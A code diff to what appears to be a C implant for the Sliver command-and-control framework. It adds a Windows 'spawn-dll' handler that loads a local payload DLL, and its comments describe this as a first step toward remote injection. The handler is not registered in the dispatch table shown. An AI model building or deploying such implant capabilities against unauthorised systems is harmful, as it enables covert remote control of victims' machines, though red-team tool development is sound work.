@@ -11,6 +11,7 @@
 #include "sliver/platform.h"
 #include "sliver/privs.h"
 #include "sliver/screenshot.h"
+#include "sliver/dllload.h"
 #include "sliver/services.h"
 #include "sliver/token.h"
 #include "sliver/proc.h"
@@ -1097,6 +1098,23 @@ static int handle_reg_read_hive(const sliver_envelope_t *req, sliver_buf_t *out)
 }
 #endif
 
+
+/* --- spawn-dll (40 -> 41): self-load only (stage C step 1) --------------- */
+#if defined(_WIN32)
+static int handle_spawn_dll(const sliver_envelope_t *req, sliver_buf_t *out) {
+  int rc;
+  (void)req;
+  /* Stage C step 1: self-load only, no remote injection. */
+  rc = sliver_dll_load("sliver_payload.dll", NULL);
+  if (rc < 0) {
+    char err[160];
+    (void)snprintf(err, sizeof(err), "spawn-dll: LoadLibrary failed (Win32 %d)", -rc);
+    return sliver_empty_response_encode(out, err);
+  }
+  return sliver_empty_response_encode(out, NULL);
+}
+#endif
+
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
     {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
@@ -1199,6 +1217,8 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
+
 
 
 
